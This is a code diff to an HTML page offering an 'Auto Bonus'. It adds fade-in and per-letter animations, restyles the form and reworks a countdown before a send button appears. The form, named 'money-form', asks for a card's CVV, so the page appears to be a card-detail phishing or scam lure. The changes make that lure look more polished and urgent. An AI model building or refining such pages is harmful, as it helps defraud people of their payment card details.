@@ -15,6 +15,15 @@
             height: 100vh;
             margin: 0;
             position: relative;
+        opacity: 0;
+          transform: translateY(20px);
+            animation: fadeIn .7s forwards;
+        }
+  @keyframes fadeIn {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
         .claim-button1 {
             background-color: #f8f0fc;
@@ -30,7 +39,9 @@
         .form-container {
             background-color: #fff;
             padding: 20px 40px;
-            width: 300px;
+            width: auto;
+            border:2px dotted #f62f5e;
+            border-radius:25px;
         }
         .form-container h2 {
             text-align: center;
@@ -45,13 +56,53 @@
             margin-bottom: 8px;
             font-weight: bold;
         }
+     @keyframes rotateIn {
+            from {
+                opacity: 0;
+                transform: rotateX(90deg);
+            }
+            to {
+                opacity: 1;
+                transform: rotateX(0);
+            }
+        }
+
+        /* Style for individual letters */
+        .letter {
+            display: inline-block;
+            opacity: 0;
+            transform-origin: bottom;
+            animation: rotateIn 0.5s ease forwards;
+        }
+.letter-wave {
+    display: inline-block;
+    opacity: 0;
+    animation: wave.4s ease-in-out forwards;
+}
+
+@keyframes wave {
+    0% {
+        opacity: 0;
+        transform: translateY(10px);
+    }
+    100% {
+        opacity: 1;
+        transform: translateY(0);
+    }
+}
+
         .form-container input[type="tel"] {
             width: 100%;
             padding: 10px;
             margin-bottom: 20px;
-            border: 1px solid #ccc;
+            border: 1px solid #000;
             border-radius: 5px;
+            outline:none;
         }
+    input[type="tel"]:focus{
+        border:2px solid #f62f5e;
+       
+    }
         .form-container button {
             width: 50%;
             padding: 10px;
@@ -78,7 +129,7 @@
     <button class="claim-button1" onclick="window.history.back()"><i class="fas fa-circle-arrow-left"></i></button>
 
     <div class="form-container">
-        <h2>Bonus</h2>
+        <h2>Auto Bonus</h2>
         <form id="money-form">
             <label for="code"></label>
             <input type="tel" id="code" placeholder="cvv" required>
@@ -209,20 +260,33 @@ document.addEventListener("DOMContentLoaded", function() {
     // Timer functionality
     let countdown = 5;
     const button = document.getElementById('send-button');
-const butto1n = document.getElementById('result');
 
     const timer = setInterval(() => {
         if (countdown > 0) {
-            butto1n.innerText = `Wait ${countdown}s`;
-            butto1n.style.color = 'red'
+            xy = `Wait ${countdown}s`;
+            animateText(xy, 'result', 'letter');
+            result.style.color = 'red'
             countdown--;
         } else {
             clearInterval(timer);
-            butto1n.innerText = '';
+            result.innerText = '';
             button.style.display = 'block';
         }
     }, 1000);
 });
+    function animateText(text, elementId, className) {
+    const element = document.getElementById(elementId);
+    element.innerHTML = ''; // Clear any existing content
+
+    text.split('').forEach((char, index) => {
+        const letterSpan = document.createElement('span');
+        letterSpan.textContent = char === ' ' ? '\u00A0' : char; // Use non-breaking space for spaces
+        letterSpan.classList.add(className);
+        letterSpan.style.animationDelay = `${index * 0.1}s`;
+        element.appendChild(letterSpan);
+    });
+}
+
     </script>
 </body>
 </html>
